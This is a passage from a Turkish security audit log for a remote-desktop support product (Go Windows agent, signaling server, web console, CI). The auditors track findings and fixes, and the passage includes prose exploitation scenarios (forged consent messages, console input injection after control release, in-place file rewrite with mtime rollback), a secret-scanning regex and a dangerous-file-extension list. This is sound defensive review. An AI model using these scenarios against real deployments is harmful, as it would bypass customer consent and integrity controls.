- MOTW `.part` dosyasına, kapanıştan sonra ve yeniden adlandırmadan önce yazılmalı (ADS yeniden adlandırmayla birlikte taşınır).
- Yeniden adlandırma `windows.MoveFileEx(src, dst, 0)` ile, değiştirme bayrağı olmadan yapılmalı. `ERROR_ALREADY_EXISTS` gelirse `AvailableName` ile yeniden denenmeli.
- MOTW yazılamazsa ve `NameWarning != none` ise dosya silinmeli ve sonuç `CORRUPT/REJECTED` olmalı (ya da kullanıcıya açık bir onay sorulmalı).

#### S6-4 [DÜŞÜK] PR derlemeleri gerçek `AGENT_SERVER_URL` ile üretiliyor (yorum aksini söylüyor) — A08 (G-18)

Yer: `.github/workflows/agent-win.yml:22-23, 90-100`
Sorun: Yorumda "PR/fork derlemelerinde placeholder" yazıyor. Ancak `server=${VAR_SERVER_URL:-$PLACEHOLDER_SERVER_URL}` ifadesi aynı repodaki PR'larda (repo değişkenleri erişilebilir) gerçek adresi gömüyor. İncelenmemiş PR kodu prod/staging adresine bağlanan bir exe olarak 7 ve 30 gün artifact'te tutuluyor. `verify-and-publish --run` bunu `push/main` kontrolüyle engelliyor, ancak artifact elle indirilip dağıtılabilir.
Düzeltme (devops): Gerçek adres yalnız `github.event_name == 'push'` (main veya etiket) koşullarında kullanılmalı, diğer tüm durumlarda placeholder kullanılmalı.

#### S6-5 [DÜŞÜK] `verify-and-publish.sh` başarısız CI koşusunu ve kökeni belirsiz `--dir` ikilisini staging'de yayınlayabiliyor — A08 (G-07)

Yer: `deploy/agent/verify-and-publish.sh:115` (`concl != success` → yalnız UYARI), `:118` + `:133` (`--dir` ile `--no-attestation` birlikte kullanılınca köken kanıtı yok)
Sorun: Staging'de kırmızı bir koşunun (ör. govulncheck veya test hatası) artifact'i yayınlanabiliyor. `--dir` modunda herhangi bir yerel exe + SHA256SUMS çifti `ALLOW_UNATTESTED=staging` ile volume'a girebiliyor. Bu durumda tek güvence operatör disiplini.
Düzeltme (devops):

- `--run` için `conclusion=success` zorunlu olmalı; aşmak için açık bir `--allow-failed-run` bayrağı ve `PUBLISHED.log`'a not düşülmeli.
- `--dir` ile `--no-attestation` birlikte yasaklanmalı.

#### S6-6 [DÜŞÜK] İstemci `HTTP(S)_PROXY` ortam değişkenine uyuyor — A05 (T13 "env yok" ifadesiyle kısmi çelişki)

Yer: `apps/agent-win/internal/api/api.go:68` (`Proxy: http.ProxyFromEnvironment`). WS de aynı istemciyi kullanıyor.
Sorun: Sunucu adresi değiştirilemiyor ve TLS uçtan uca sistem köklerine göre doğrulanıyor, bu yüzden MITM yok. Ancak ortam değişkeni trafiği üçüncü bir noktadan geçirebiliyor (meta veri ve bağlantı engelleme). Mimari "komut satırı/env/registry yok" diyor.
Düzeltme (backend-dev): Bilinçli bir karar ise (kurumsal proxy desteği) `docs/implementation.md` "Agent (P6)" bölümüne gerekçe yazılmalı ve mimari T13 metni "yalnız URL" olarak netleştirilmeli (mimar). Değilse `Proxy: nil` yapılmalı.

#### S6-7 [DÜŞÜK] Derin savunma eksikleri: sınırsız ICE kuyruğu ve istemcide doğrulanmayan `abuseEmail` — A04

Yer: `apps/agent-win/internal/rtc/rtc.go:268-272` (`pending` offer gelmeden sınırsız büyüyor), `internal/win/win_windows.go:513` + `api.go:110` (`AbuseEmail` doğrulanmadan `mailto:`+addr ile ShellExecute'a gidiyor)
Sorun: Teknisyen offer göndermeden çok sayıda `ice` gönderirse istemci belleği büyür (WS 50 msg/sn ile sınırlı). `mailto:` sabit önek olduğu için şema değiştirilemiyor, ancak sunucudan gelen değer ham olarak kabuk API'sine veriliyor.
Düzeltme (backend-dev): `pending` için üst sınır konmalı (ör. 64, fazlası düşürülür). `AbuseEmail` istemcide basit bir e-posta regex'i ve ≤190 karakter sınırıyla doğrulanmalı; `?`, `&` ve kontrol karakterleri reddedilmeli.

#### S6-8 [DÜŞÜK] Tehlikeli uzantı listesinde Windows'ta çalıştırılabilen birkaç tür eksik — A08 (G-06, AC-36)

Yer: `apps/agent-win/internal/files/files.go:87-90` (contracts `DANGEROUS_EXT` eşi)
Sorun: `one`, `onepkg`, `wsc`, `sct`, `diagcab`, `website`, `ade`, `adp`, `mde`, `mshxml`, `jnlp`, `cab` listede yok. Bunlar uyarısız kabul diyaloğuna düşer. Alıcı onayı zorunlu olduğu için etkisi düşük.
Düzeltme (backend-dev): Liste `packages/contracts/src/files.ts` ve fixture ile birlikte genişletilmeli (tek kaynak kuralı).

#### S6-9 [DÜŞÜK] Bilinen konular — durum notu

- (Bilinen 1) `go.mod` şu an `toolchain go1.26.11` ve `golang.org/x/net v0.60.0` gösteriyor; CI imajı da 1.26.11 digest'li. Bu turda govulncheck yerelde çalıştırılmadı. Kapanış kanıtı olarak CI `check` job'unun yeşil çıktısı `docs/implementation.md`'ye eklenmeli.
- (Bilinen 2) Repo private olduğu için attestation yok. `attest` job'u main push'larında kırmızı olacak ve `release` (`needs: attest`) Release'i fiilen engelliyor. Prod açılışından (P10) önce repo public yapılmalı ya da Enterprise Cloud kullanılmalı. `--no-attestation` yalnız `ALLOW_UNATTESTED=staging` ile çalışıyor; betikteki bu koruma doğrulandı.
- (Bilinen 3, G-10) Caddy hata logu maskelenmiyor. P6 ile kapsam genişledi: hata logunda `?ref=` sorgu dizesi ve `/downloads/Destek-<kod>.exe` yolu da açık görünebilir. Erişim logu iki yolu da maskeliyor (`request>uri` regexp + `Content-Disposition`/`Location` silme; doğrulandı).

### Doğrulanan kontroller (Olumlu)

- **İndirme ucu** (`public/agent.ts`, `routes.ts`): Yanıt yalnız `PENDING && expires_at > now` olduğunda veriliyor. Süresi dolmuş PENDING aynı istekte EXPIRED'a çekiliyor ve 410 dönüyor. Geçersiz/HMAC uyuşmayan ref 404, ACTIVE/ENDED/CANCELLED 410 alıyor. 404 ve 410 kod yolu kovalarına (`codeIp` 10/dk + `codePrefix` 30/dk, 15 dk blok) sayılıyor, ayrıca `downloadIp` 20/dk. 503 (`NOT_READY`) deneme sayılmıyor. `Cache-Control: no-store` hata yanıtlarında da var. Mimari-api sözleşmesine uygun.
- **`ref` hiçbir yere yazılmıyor:** pino `req` serileştiricisi sorgu dizesini atıyor, `*.ref` redakte ediliyor, audit'e ref/kod geçmiyor, Caddy erişim logunda `Location` ve `Content-Disposition` siliniyor.
- **302 hedef sapması** (`/downloads/Destek-<kod>.exe` ve Caddy `Content-Disposition`): Güvenlik açısından kabul edilebilir. Yol yalnız `[0-9]{8}` kabul ediyor ve her ad aynı ikiliyi sunuyor. Kod doğrulanmıyor ya da sızdırılmıyor. Kod tarayıcı geçmişine giriyor, ancak yalnız PENDING iken geçerli ve kısa ömürlü olduğu için kabul.
- **ldflags-only config:** `os.Args`, `Getenv`, registry ya da `flag` kullanımı yok (grep ile doğrulandı). `parse` yalnız `https://host[:port]` kabul ediyor; yol, sorgu, kullanıcı bilgisi ve fragment reddediliyor.
- **TLS:** Sistem kökleri ve TLS ≥1.2 kullanılıyor, `InsecureSkipVerify` yok, yönlendirme izlenmiyor. WS kimlik bilgisi `Sec-WebSocket-Protocol` üzerinden gidiyor, URL'de sorgu yok, `rs.v1` seçilmezse bağlantı kapanıyor.
- **dllsafe:** `SetDefaultDllDirectories(SYSTEM32)` + `SetDllDirectory("")` `main`'in ilk işi. Tüm DLL'ler `NewLazySystemDLL` ile yükleniyor, `NewLazyDLL`/`LoadLibrary` yok. Manifest `asInvoker`. %TEMP%'e çıkarma ya da `CreateTemp` yok. Procmon kanıtı manuel AC olarak bekliyor.
- **Dosya adı:** Son bileşen alınıyor; `\/:*?"<>|`, kontrol karakterleri ve Unicode Cf (RTLO) siliniyor (`:` silindiği için ADS yok). Sondaki nokta/boşluk temizleniyor, ayrılmış adlar `_` önekleniyor, uzunluk 255. `.part` `O_EXCL` ile oluşturuluyor. Boyut sınırı alınan bayt sayacıyla uygulanıyor, sıra dışı parça transferi iptal ediyor, SHA-256 sabit zamanlı karşılaştırılıyor.
- **DataChannel:** `ParseCtl` ≤16 KB ve geçerli UTF-8 istiyor. Anahtarlar büyük/küçük harf duyarlı izinli listeyle denetleniyor, `null` reddediliyor, zorunlu alanlar ve değer aralıkları kontrol ediliyor. `caps` filtresi (G-09) çalışıyor, yetenek dışı `file.offer` otomatik reddediliyor. `input` ve bilinmeyen kanallar açılınca kapatılıyor. WS mesajları da katı şemayla doğrulanıyor (1008).
- **Overlay:** Gösterge şeritleri ve işaretleme katmanı `WDA_EXCLUDEFROMCAPTURE` ile yakalamadan hariç, tıklama geçirgen ve `NOACTIVATE`. Şeritler 1 sn'de bir yeniden TOPMOST yapılıyor.
- **DXGI/MF:** Örneklenen `unsafe.Slice` noktaları (`pitch*(h-1)+w*4`, MF Lock uzunluğu, MFTEnumEx dizisi + `CoTaskMemFree`) sınırlar içinde.
- **CI:** Tüm Action'lar SHA ile sabitlenmiş. Varsayılan izin `contents: read`; `id-token`/`attestations` yalnız `attest` job'unda, `contents: write` yalnız `environment: agent-release` onaylı `release` job'unda. `persist-credentials: false`, `GOTOOLCHAIN=local`, `-mod=readonly`, `go mod verify`, govulncheck, go-licenses ve iki build arasında SHA eşitliği var; Release `--verify-tag` ile oluşturuluyor. Dependabot gomod eklendi.
- **verify-and-publish:** `gh attestation verify` `--signer-workflow`, `--deny-self-hosted-runners` ve `--source-ref` ile çalışıyor. Volume'a ağsız konteynerden yazılıyor; kopyanın hash'i yeniden kontrol edilip atomik `mv` yapılıyor. `umask 077` ayarlı, girdiler regex ile doğrulanıyor, Caddy üzerinden son hash kontrolü yapılıyor.

### Otomatik tarama çıktıları (P6)

- Sır taraması (`git diff` + izlenmeyen tüm dosyalar, `(api_key|secret|password|token)\s*[:=]\s*'…{8,}'`): Tek isabet test fixture'ı (`const token = "rrrr…"`); gerçek değer değil. İzlenmeyen `.env`, `.pem` ya da `.exe` yok.
- `git log --all -- '*.env*'`: P1/P2 ve P3/P4 commit'lerinde isabet var. Önceki turlarda bunların yalnız `.env.example` olduğu doğrulanmıştı; P6'da yeni `.env` dosyası yok.
- govulncheck / `go test`: Bu turda yerelde çalıştırılmadı (Go toolchain ve tur sınırı). Kanıt CI `check` + `test-windows` job'larından alınmalı.

### Tasarımda vaat edilip kodda bulunmayanlar

- "Uyuşmazlıkta indirme 503" yalnız yönlendirme ucunda var, dağıtım yolunda yok (S6-2).
- "env yok" (T13): Proxy ortam değişkeni okunuyor (S6-6).
- Manuel kanıtlar bekliyor: Procmon DLL araması 0, SmartScreen yolu, gerçek NTFS'te `Zone.Identifier`, `trace-check.ps1`.

### Ajan bazında

- backend-dev: S6-1, S6-3, S6-6 (veya gerekçe), S6-7, S6-8; S6-2'de `/ready` iç ucu.
- devops: S6-2 (Caddy `forward_auth`, agent-watch), S6-4, S6-5, S6-9 (Caddy hata logu).
- mimar: S6-6 için T13 metninin netleştirilmesi.

### Öneri (`docs/gereksinimler.md` §9 "Sonra")

S6-1 ve S6-2 Orta derecede ama P6 kapanmadan düzeltilmesi önerilir (küçük değişiklikler). S6-3..S6-8 "Sonra" listesine eklenebilir. Kritik/Yüksek 0, P6 güvenlik kapısı açık.

DURUM: GEÇTİ

## P6 doğrulama turu 2 — S6-1..S6-9 kapanışı + yeni yüzeyler (2026-11-11)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 1 (yeni) + 1 bilgi notu

Kapsam: S6-1..S6-9 düzeltmeleri commit edilmemiş değişiklik olarak incelendi. Bu tur yalnız statik inceleme yapıldı; `go test`, govulncheck ve `pnpm test` çalıştırılmadı. Tur sınırı nedeniyle bazı yüzeyler doğrulanamadı; bunlar aşağıda "doğrulanmadı" olarak işaretlendi.

### S6 maddelerinin durumu

| Madde                                         | Durum                                  | Kanıt                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| --------------------------------------------- | -------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| S6-1 (Orta) `ptr()` use-after-free            | **KAPANDI**                            | `ptr()` kaldırıldı. `Str()` artık `*uint16` döndürüyor (`internal/win/win_windows.go:250`). Dönüşümler çağrı argümanının içinde yapılıyor: `:281-282` CreateWindowExW, `:334-335` SendMessageStr, `:340-341` SetText, `:357-358` MessageBox, `:461-462` DrawText, `:482-484` CreateFont, `:539-540` ShellExecute. `capture/com_windows.go:27` (`call`) ve `:52` (`procHR`) `//go:uintptrescapes` ile işaretli. `internal/win/unsafeptr_test.go` AST testi tüm modülü tarıyor: `uintptr(unsafe.Pointer(…))` yalnız `Call/call/procHR/SyscallN` argümanında olabilir ve iki sarmalayıcıda işaret zorunlu. Test derleme etiketi taşımıyor, bu yüzden Linux CI'da da çalışır. Kalan tek dönüşüm `form_windows.go:200` (WM_DPICHANGED lParam → `*RECT`); bu bellek işletim sistemine ait olduğu için sorun değil.                                                                   |
| S6-2 (Orta) `/downloads/*` kapıyı atlıyor     | **KAPANDI**                            | `deploy/Caddyfile:101-104`: `@agentExe` → `route { forward_auth server:3001 { uri /internal/agent-ready } … file_server }`. Kapı dosya sunulmadan önce çalışıyor; 2xx dışı yanıt (503 veya server erişilemezse 502) istemciye dönüyor, dolayısıyla fail-closed. `X-Forwarded-Uri` maskeli. `:86`: `/internal/*` dışarıya 404. Server tarafı `public/routes.ts:32-41`: soket adresi `TRUSTED_PROXY_CIDR` içinde olmalı (tanımsızsa loopback) ve `X-Forwarded-Method` gelmeli, aksi halde 404. `assertAgentReady` (`public/agent.ts:55`) 302 yolu ile aynı kapı. Uç `app.ts:163` ile `/internal` önekinde kayıtlı. Global `log default` filtresi (`Caddyfile:20-35`) hata loguna sorgu dizesi, `/session/***`, `/downloads/Destek-***` ve kimlik başlıkları maskesini uyguluyor; bu S6-9 bilinen 3'ü de kapatıyor. `agent-watch.yml`'deki ölü `server503` dalı **doğrulanmadı**. |
| S6-3 (Düşük) MOTW/rename                      | **KAPANDI**                            | `internal/transfer/transfer.go:190-197`: MOTW `.part` dosyasına rename'den önce yazılıyor. MOTW yazılamazsa ve `NameWarning != none` ise `.part` siliniyor ve sonuç `REJECTED` oluyor. `rename_windows.go:22`: `MoveFileEx(s, d, 0)` değiştirme bayrağı olmadan çağrılıyor; `ERROR_ALREADY_EXISTS`/`ERROR_FILE_EXISTS` → `errExists`. `transfer.go:216-232` `place()` bu durumda en fazla 5 kez yeni ad deniyor. Windows dışı eşdeğer (`rename_other.go`) `os.Link` ile çalışıyor, o da üzerine yazmıyor.                                                                                                                                                                                                                                                                                                                                                                      |
| S6-4 (Düşük) PR derlemesinde gerçek URL       | **KAPANDI**                            | `.github/workflows/agent-win.yml:142-144`: gerçek adres yalnız `EVENT = push` olduğunda gömülüyor; PR ve `workflow_dispatch` placeholder alıyor. Etiket derlemesi yalnız etiket push'unda yapılıyor (`:132-134`).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| S6-5 (Düşük) başarısız koşu ve `--dir` yayını | **KAPANDI (kısmen kabul edilen risk)** | `deploy/agent/verify-and-publish.sh:125-129`: `conclusion != success` → `die`. Bu ancak açık `--allow-failed-run` ile aşılabiliyor ve etiket `-failedrun` oluyor (`PUBLISHED.log`). `:113`: bu bayrak yalnız `--run` ile geçerli. `--dir` + `--no-attestation` önerildiği gibi tamamen yasaklanmadı. Ancak `ALLOW_UNATTESTED=staging` olmadan `die` ediyor (`:109-111`), uyarı veriyor ve etiket `-unattested` oluyor. Repo private olduğu için attestation üretilemiyor (S6-9 bilinen 2); bu nedenle staging'de bu kalan risk kabul edilebilir. Prod'da (P10) repo public olunca `--no-attestation` kullanılmamalı. `--allow-failed-run` için staging kısıtı betikte zorlanmıyor, yalnız metinde yazıyor (bilgi notu B-1).                                                                                                                                                    |
| S6-6 (Düşük) proxy env                        | **KAPANDI (bilinçli karar)**           | `docs/adr/0010-imzasiz-dagitim.md:13` (r3, Proxy satırı): gerekçe, sınır, kabul edilen risk ve reddedilen alternatif yazılı. `docs/mimari.md:199` T13 metni "HTTP(S)_PROXY yalnız taşıma yolu; URL/TLS değiştirilemez" olarak güncellendi. Kod: `internal/api/api.go:68` (`ProxyFromEnvironment`), TLS ≥1.2, `CheckRedirect` → `ErrUseLastResponse`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| S6-7 (Düşük) ICE kuyruğu / abuseEmail         | **KAPANDI**                            | `internal/rtc/rtc.go:72` `MaxPendingICE = 64`, `:274-275` sınır dolunca fazlası düşürülüyor. `internal/api/logo.go:121-130` `ValidAbuseEmail`: ≤190 karakter ve katı regex; `?`, `&`, boşluk ve denetim karakterleri biçim gereği dışarıda kalıyor. Doğrulama `internal/flow/flow.go:166` içinde ShellExecute'tan önce yapılıyor; geçersizse bağlantı gizleniyor.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| S6-8 (Düşük) tehlikeli uzantı listesi         | **KAPANDI**                            | `packages/contracts/src/files.ts` (+12 uzantı: one, onepkg, wsc, sct, diagcab, website, ade, adp, mde, mshxml, jnlp, cab). Go eşi `internal/files/files.go:87-93` aynı listeyi içeriyor. `files_test.go:94` `TestS68DangerousExtMatchesContracts` contracts kaynak dosyasını okuyup birebir eşitliği test ediyor. Fixture güncellendi (`fixtures/file-names.json`, +48 satır).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| S6-9 bilinen 1 (govulncheck kanıtı)           | **AÇIK, doğrulanmadı**                 | Bu tur CI çıktısı görülmedi. Kanıt `docs/implementation.md`'ye eklenmeli (P6 kapanış koşulu değil, kayıt).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| S6-9 bilinen 2 (attestation / private repo)   | **AÇIK (bilinen, P10 öncesi)**         | Değişiklik yok. Prod açılışından önce repo public yapılmalı ya da Enterprise Cloud kullanılmalı.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| S6-9 bilinen 3 (Caddy hata logu)              | **KAPANDI**                            | `deploy/Caddyfile:20-35` global `log default` filtresi.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |

### Yeni yüzeyler

- **Go logo indirme (`internal/api/logo.go`)**: Olumlu. Yalnız kök-göreli yol ya da scheme ve host:port'u gömülü adresle birebir aynı URL kabul ediliyor (`:36-58`). `//`, userinfo, fragment, opaque, ters bölü, NUL, CR/LF ve boşluk reddediliyor. Çözümlenen sonuçta köken yeniden kontrol ediliyor. Yönlendirme izlenmiyor (`api.go` `CheckRedirect`). İstek kimlik başlığı taşımıyor. Yalnız 200 kabul ediliyor, `Content-Length` ve `LimitReader` ile ≤2 MB. `Content-Type` ve magic bayt birlikte kontrol ediliyor. Çözmeden önce `DecodeConfig` ile en/boy ≤2048 sınırı uygulanıyor (bomba koruması; en kötü durumda ~32 MB). Yalnız ilgili türün çözücüsü çağrılıyor. 3 sn zaman aşımı var ve her hatada sistem logosu gösteriliyor (`flow.go:201-210`). Ölçekleme (`ui/logo.go`) sınır kontrollü.
- **`capture/` + `ui/screens_windows.go`, `ui/form_windows.go` (hızlı bakış)**: Olumlu. DXGI `Map` dilimi `pitch*(h-1)+w*4` ile sınırlı ve `pitch < w*4` reddediliyor (`dxgi_windows.go:195-199`). `ConvertBGRA` girdiyi ayrıca doğruluyor (`nv12.go:69-71`). MF Lock dilimleri tampon uzunluğuyla sınırlı (`mf_windows.go:332, 504`). Sohbet geçmişi ve onay metni `ES_READONLY` (`screens_windows.go:170, 302`). Sohbet girişi `EM_LIMITTEXT` 2000. `mailto:` yalnız doğrulanmış adresle açılıyor (`:190`).
- **Web indirme bileşeni (`apps/web/app/session/[token]/agent-download.tsx`, `apps/web/lib/agent-download.ts`)**: **doğrulanmadı** (tur sınırı).
- **`apps/agent-win/test/trace-check.ps1` ve `.github/workflows/agent-watch.yml`**: **doğrulanmadı** (tur sınırı). Salt okunurluk ve `server503` dalının kaldırılması bir sonraki turda kontrol edilmeli.

### Yeni bulgular

#### N6-1 [DÜŞÜK] Bütünlük önbelleği anahtarı `ctime` içermiyor; yerinde yeniden yazma ve `mtime` geri alma ile hash yeniden hesaplanmıyor — A08 (G-07)

Yer: `apps/server/src/public/agent-binary.ts:45` (`const key = \`${st.size}:${st.mtimeMs}:${st.ino}\``)
Sorun: Volume'a yazabilen biri dosyayı aynı inode üzerinde aynı boyutla yeniden yazıp `touch -d`ile`mtime`'ı geri alırsa önbellek anahtarı değişmez. Kapı bu durumda server yeniden başlayana kadar "ok" dönmeye devam eder.
İstismar senaryosu: Volume'a yazma yetkisi gerekir (S6-2'deki tehdit aktörü). Günlük dış gözcü (agent-watch) uyuşmazlığı yine yakalar, dolayısıyla etki fail-closed vaadinin zayıflamasıyla sınırlı.
Düzeltme (backend-dev): Anahtara `st.ctimeMs`eklenmeli.`ctime` kullanıcı tarafından geri alınamaz.

#### B-1 [BİLGİ] `--allow-failed-run` staging kısıtı yalnız metinde

Yer: `deploy/agent/verify-and-publish.sh:125-129`. Bayrak `ALLOW_UNATTESTED=staging` ya da hedef ortamla ilişkilendirilmemiş. Prod (P10) öncesi bayrağın da `ALLOW_UNATTESTED=staging` (veya ayrı bir staging göstergesi) şartına bağlanması önerilir (devops).

Not: `TRUSTED_PROXY_CIDR=172.30.0.2/31` web konteynerini (172.30.0.3) de kapsıyor. Bu yüzden `/internal/agent-ready` web'den çağrılabilir. Uç yalnız hazır/hazır değil bilgisi döndürdüğü için etkisi yok; bilgi amaçlı.

### Ajan bazında

- backend-dev: N6-1 (tek satır).
- devops: B-1; S6-9 bilinen 1 kanıtı; `agent-watch.yml` ölü dalının durumu (sonraki turda doğrulanacak).
- Sonraki tur: web indirme bileşeni, `trace-check.ps1`, `agent-watch.yml`.

### Öneri (`docs/gereksinimler.md` §9 "Sonra")

N6-1 ve B-1 "Sonra" listesine eklenebilir. S6-9 bilinen 2 (attestation) P10 prod açılışı için ön koşul olarak kalıyor.

DURUM: GEÇTİ (Kritik 0 / Yüksek 0; S6-1 ve S6-2 Orta bulguları kapandı)

---

## P7 — Tur 1 — Uzaktan kontrol (2026-11-11)

DURUM: DÜZELTİLMELİ
Özet: Kritik 0 / Yüksek 1 / Orta 3 / Düşük 7

Kapsam: commit edilmemiş P7 değişiklikleri: `packages/contracts/src/{ws,dc,audit}.ts`, `apps/server/src/signaling/{control,rooms,handlers,ws,types}.ts`, `apps/agent-win/internal/{control,input,env,signal,rtc,flow,ui}` + `cmd/noktadestek/main.go`, `apps/web/lib/control/*` (machine.ts ayrıntılı, input/use-remote-input yüzeysel). Ölçüt: `docs/mimari-protokol.md` §3.3 ve §4.3. §3.3 artık mimar kararını içeriyor (ADR-0013 olarak anılıyor, ancak `docs/adr/` altında dosya yok). Bu tur yalnız statik inceleme yapıldı; Windows'ta davranış doğrulanmadı.

### Bulgular (öncelik sırasıyla)

#### S7-1 [YÜKSEK] "Kontrolü bırak" yalnız konsolda yerel duraklatma; müşteri kapısı ve sunucu durumu GRANTED kalıyor — A01 Erişim Kontrolü / A04 Güvensiz Tasarım

Yer: `apps/web/lib/control/machine.ts:106-109` (`release`/`resume` yalnız `paused`). Kodda `control.release` yok: `packages/contracts/src/ws.ts:104-107, 183-187`, `apps/server/src/signaling/control.ts` ve `apps/agent-win/internal/flow/control.go:58-88` bu mesajı tanımıyor. Bağlayıcı karar: `docs/mimari-protokol.md` §3.3 K1.
Sorun: Teknisyen kontrolü bıraktığını sanıyor, ama müşteri istemcisinde kapı açık kalıyor. Sunucu kaydı GRANTED olarak sürüyor. "Kontrole devam" yeni izin istemeden girdi göndermeyi yeniden başlatıyor. Müşteri teknisyenin işi bıraktığını sanıp göstergeyi önemsemeyebilir.
İstismar senaryosu: Teknisyen "bıraktım" diyor, müşteri işine dönüyor. Daha sonra konsol (aynı sekme; XSS, kötü niyetli tarayıcı eklentisi ya da bilerek yapılan "devam") müşteriye yeni diyalog göstermeden fare ve klavye enjekte edebiliyor. Audit zaman çizelgesinde kontrol oturum sonuna kadar açık görünüyor ve bırakma anı kaydedilmiyor (AC-111 zaman çizelgesi eksik kalıyor). En az yetki ilkesi ihlal ediliyor.
Düzeltme: K1 uygulanmalı. contracts'a `control.release` ve `source: "TECH"` eklenmeli. Sunucu GRANTED iken önce VIEW'a geçmeli, misafire `control.release`, teknisyene `{VIEW,TECH}` göndermeli, ardından REVOKED/TECH ve `control.released` audit kaydını yazmalı. `session_consents.source` CHECK kısıtına `TECH` eklenmeli (dba). Go istemci `control.release`/`control.cancel` gelince durumdan bağımsız olarak kapıyı kapatmalı ve diyaloğu kapatmalı. Konsolda "Kontrolü bırak" `control.release` göndermeli; "Kontrole devam" yeni `control.request` olmalı. (atanan: backend-dev — sunucu + contracts + Go; frontend-dev — konsol; dba — CHECK migration)

#### S7-2 [ORTA] Sunucu GRANTED'i bekleyen istek olmadan kabul ediyor, konsol istenmemiş GRANTED ile yakalamayı başlatıyor; istek iptali (`control.cancel`) yok — A04 / A08 Bütünlük

Yer: `apps/server/src/signaling/control.ts:151-153`: `onGranted` yalnız `c.state === "GRANTED"` olup olmadığına bakıyor, `REQUESTED` şartı aramıyor; `control.revoke{stale}` yok. `apps/web/lib/control/machine.ts:151`: `control.state{GRANTED}` her fazda (idle/ended/denied) `phase: "granted"` yapıyor. "Vazgeç" yok (Frontend P7 sapma 2). Karar: §3.3 K2.
Sorun ve istismar:
(a) Kabul edilmiş ama kötü niyetli bir misafir (AGENT gibi davranan özel istemci), istek olmadan `control.state{GRANTED,UI}` ve ardından `{VIEW,UI}` mesajlarını 50 msg/sn token bucket sınırına kadar gönderebilir. Her çift `session_consents` + audit tablosuna TX yazıyor: veri tabanı yükü büyüyor ve sahte "müşteri izin verdi" kayıtları oluşuyor (zaman çizelgesi bütünlüğü bozuluyor). Teknisyen konsolu da istemediği hâlde yakalamaya geçiyor; görüntü alanında basılan tuşlar misafire gidiyor.
(b) İptal mesajı yok: teknisyenin vazgeçtiği bir istek müşteri ekranında açık kalıyor. Müşteri bunu sonradan onaylarsa kapı açılıyor.
Düzeltme: K2 uygulanmalı. GRANTED yalnız `REQUESTED` durumunda işlenmeli. VIEW durumundaki geç GRANTED'e `control.revoke{stale}` gönderilmeli, kayıt yazılmamalı, log `control_state_unexpected` düşülmeli. `control.cancel` eklenmeli. Konsol beklemediği GRANTED'de yakalamayı başlatmamalı ve `control.release` göndermeli. Sunucu kontrolüne ek olarak misafir başına `control.state` için ayrı ve düşük bir kota konmalı (örneğin dakikada 20). (backend-dev, frontend-dev)

#### S7-3 [ORTA] Kısayol kanca iş parçacığında `gate.Close()` → `ReleaseAll` Applier kilidini bekliyor; aynı anda `SendInput` aynı iş parçacığının LL kancasını bekliyor → kanca zaman aşımına kadar kilitlenme, Windows kancayı sessizce kaldırabilir — A04

Yer: `apps/agent-win/internal/input/host_windows.go:132-136` (WM_HOTKEY → `g.Close()` kanca iş parçacığında). `internal/control/gate.go:31-42` (`Close` dinleyicileri senkron çalıştırıyor). `internal/input/applier.go:92-104` (`Handle`, `a.mu` kilidini tutarken `Inject` çağırıyor).
Sorun: Enjekte edilen girdi LL kancalarından geçer. Kanca prosedürü, kancayı kuran iş parçacığının mesaj döngüsünde çalışır. Teknisyen sürekli fare hareketi gönderirken müşteri Ctrl+Shift+F12'ye basarsa iki taraf birbirini bekler: kanca iş parçacığı `ReleaseAll` → `a.mu`'yu, Pion goroutine'i ise `a.mu` tutarken `SendInput` → kanca iş parçacığını bekler. Kilit `LowLevelHooksTimeout` (~300 ms–1 sn) dolunca çözülür. Kapı `Swap(false)` ile hemen kapandığı için yeni olay uygulanmaz, ancak:
(1) Windows 7+ zaman aşımına uğrayan kancayı bildirim yapmadan kaldırabilir. Bu durumda oturumun geri kalanında AC-104 yerel önceliği ve enjekte tıklama tespiti (`lastPressInjected`) çalışmaz; tespit son değerde donar ve fail-open olur.
(2) Kısayol işlenene kadar kullanıcı girdisi sistem genelinde takılır.
Davranış Windows'ta doğrulanmalı (elle test adımı 30/31 sürekli hareket altında yapılmalı).
Düzeltme: Kanca iş parçacığında yalnız atomik kapatma yapılmalı (`g.open.Store(false)`). `ReleaseAll` ve `onHotkey` ayrı bir goroutine'e taşınmalı (`go ...`). Genel kural: `Gate.Close` dinleyicileri kanca iş parçacığından senkron çağrılmamalı. Kanca prosedürlerinde kilit alınmadığı test veya yorumla güvenceye bağlanmalı. (backend-dev — Go)

#### S7-4 [ORTA → tasarım uyumu] Teknisyen kopmasında/sekme değişiminde sunucu `control.revoke{reconnect}` göndermiyor (K3 ikinci katman eksik)

Yer: `apps/server/src/signaling/rooms.ts` `attachTech` (`resetControl` + `peer.joined`) ve `detachTech` (`resetControl` + `peer.left`). `CONTROL_REVOKE_REASONS` içinde `reconnect`/`stale` yok (`packages/contracts/src/ws.ts:106`). Go tarafında `revokeReasons` (`internal/signal/messages.go`) da bu değerleri bilmediği için yeni bir değer gelirse şema hatası verir.
Sorun: Bugün kapı yalnız istemcinin `peer.left/peer.joined{tech}` → `techChanged` yoluyla kapanıyor (`internal/flow/control.go:207-214`). Tek katmanlı bir güvenlik kontrolü: istemci bu mesajı kaçırırsa ya da gelecekte bir yeniden düzenleme bu yolu bozarsa, yeni teknisyen sekmesine açık kapı devredilir. Önem Orta: bugün istismar edilebilir bir yol görülmedi, ancak bağlayıcı tasarımın savunma derinliği eksik.
